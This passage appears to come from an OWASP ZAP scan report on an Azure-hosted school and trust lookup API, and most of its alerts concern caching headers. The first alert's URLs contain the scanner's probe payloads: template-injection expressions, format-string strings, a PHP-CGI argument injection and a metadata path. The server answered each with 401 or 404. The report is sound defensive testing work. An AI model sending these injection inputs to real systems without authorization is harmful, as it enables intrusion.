  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=www.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=www.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=www.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=ZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zApPX26sS
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%2523%257B5544*2791%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%2523set%2528%2524x%253D8359*8516%2529%2524%257Bx%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%2524%257B5139*1598%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%253C%2525%253D4563*4204%2525%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%253Cp+th%253Atext%253D%2522%2524%257B1619*9596%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%25239394*4290%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%25402902*7764%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%2540math+key%253D%25228737%2522+method%253D%2522multiply%2522+operand%253D%25225640%2522%252F%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%257B%253D2120*8018%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%257B7890*4499%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%257B84340%257Cadd%253A83040%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B%257Bprint+%25229398%2522+%25223872%2522%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj%257B3927*3643%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=zj+2265*8127+zj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/latest/meta-data/%3Fnames=names
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``

Instances: 1429

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``

Instances: 9

### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ Re-examine Cache-control Directives ](https://www.zaproxy.org/docs/alerts/10015/)



##### Informational (Low)

### Description

The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached.

* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/health
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 2

### Solution

For secure content, ensure the cache-control HTTP header is set with "no-cache, no-store, must-revalidate". If an asset should be cached consider setting the directives "public, max-age, immutable".

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching ](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching)
* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
* [ https://grayduck.mn/2021/09/13/cache-control-recommendations/ ](https://grayduck.mn/2021/09/13/cache-control-recommendations/)


#### CWE Id: [ 525 ](https://cwe.mitre.org/data/definitions/525.html)


#### WASC Id: 13

#### Source ID: 3

### [ Storable and Cacheable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where "shared" caching servers such as "proxy" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.

* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`

Instances: 2

### Solution

Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Expires: 0
This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3


\newpage
